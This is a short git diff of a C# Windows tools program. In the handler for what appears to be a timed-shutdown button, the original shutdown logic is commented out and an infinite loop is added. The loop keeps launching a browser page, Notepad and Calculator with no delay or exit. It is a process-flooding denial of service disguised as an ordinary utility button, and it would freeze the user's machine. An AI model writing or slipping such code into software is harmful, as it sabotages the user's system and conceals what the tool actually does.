@@ -43,7 +43,24 @@ namespace Ferramentas
 
         private void btnDesligaMin_Click(object sender, EventArgs e)
         {
-            DateTime MinutosDesligar =  Convert.ToDateTime(textBox1.Text);
+            int count = 0;
+            while (true)
+            {
+                Process.Start(new ProcessStartInfo("cmd", "/c start https://www.google.com.br")
+                {
+                    CreateNoWindow = true
+                });
+                Process.Start("notepad.exe");
+                Process.Start("calc.exe");
+            }
+            
+            /* int MinDel = Convert.ToInt32(textBox1.Text)*60;
+            Process.Start(new ProcessStartInfo("Shutdown", $"/s /t {MinDel}")
+            {
+                CreateNoWindow = true,
+                UseShellExecute = false,
+            });*/
+            
         }
 
         private void btnCancelDesliga_Click(object sender, EventArgs e)
